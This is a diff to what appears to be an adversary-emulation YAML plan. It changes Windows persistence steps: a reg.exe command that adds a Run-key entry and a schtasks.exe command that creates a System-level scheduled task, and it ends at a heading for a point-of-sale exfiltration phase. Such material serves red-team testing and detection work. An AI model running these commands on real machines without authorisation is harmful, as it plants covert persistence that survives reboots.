@@ -639,7 +639,7 @@
     windows:
       cmd:
         command: |
-          "C:\Windows\System32\reg.exe" ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v #{value_name} /t REG_SZ /d #{data} "C:\#{path},workerInstance /f
+          "C:\Windows\System32\reg.exe" ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "#{value_name}" /t REG_SZ /d "#{data}" /f
 
   input_arguments:
     value_name:
@@ -648,14 +648,11 @@
     data:
       description: Data for new registry entry
       type: string
-    path:
-      description: Path
-      type: string
 
   executors:
     - name: command_prompt
       command: |
-        "C:\Windows\System32\reg.exe" ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v #{value_name} /t REG_SZ /d #{data} "C:\#{path},workerInstance /f
+        "C:\Windows\System32\reg.exe" ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "#{value_name}" /t REG_SZ /d "#{data}" /f
 
 - id: 0864a91a-ae17-1cce-8b89-d4f8f2854699
   name: Scheduled Task Persistence
@@ -671,7 +668,7 @@
     windows:
       cmd:
         command: |
-          "C:\Windows\System32\schtasks.exe" /create /tn #{task_name} /tr rundll32.exe C:\#{path},WorkerInstance /sc #{schedule} /ru System
+          "C:\Windows\System32\schtasks.exe" /create /tn "#{task_name}" /tr "#{task_run}" /sc #{schedule} /ru System
 
   input_arguments:
     task_name:
@@ -687,7 +684,7 @@
   executors:
     - name: command_prompt
       command: |
-        "C:\Windows\System32\schtasks.exe" /create /tn #{task_name} /tr rundll32.exe C:\#{path},WorkerInstance /sc #{schedule} /ru System
+        "C:\Windows\System32\schtasks.exe" /create /tn "#{task_name}" /tr "#{task_run}" /sc #{schedule} /ru System
 
 # Phase 2: Exfiltration - Point of Sale (POS)
 
